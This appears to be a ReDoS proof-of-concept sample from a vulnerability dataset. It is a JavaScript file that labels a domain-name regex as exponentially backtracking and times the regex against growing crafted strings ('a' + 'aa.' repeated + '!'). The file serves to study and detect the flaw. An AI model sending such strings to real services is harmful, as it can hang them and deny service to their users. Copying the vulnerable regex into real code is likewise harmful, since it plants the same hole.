/**
 * vuln pattern: EOD
 * vuln degree: EXP
 * mul vuln: N
 * vuln location: (?:(?!\.|-)([a-z0-9\-\*]{1,63}|([a-z0-9\-]{1,62}[a-z0-9]))\.)+
 */
var REGEX = /^(?=^.{1,254}$)(^(?:(?!\.|-)([a-z0-9\-\*]{1,63}|([a-z0-9\-]{1,62}[a-z0-9]))\.)+(?:[a-z]{2,})$)$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'a' + 'aa.'.repeat(i) + '!'
    REGEX.exec(attack_str);
    var time_cost = Date.now() - time;
    console.log("i.length: " + i + ": " + time_cost+" ms")
}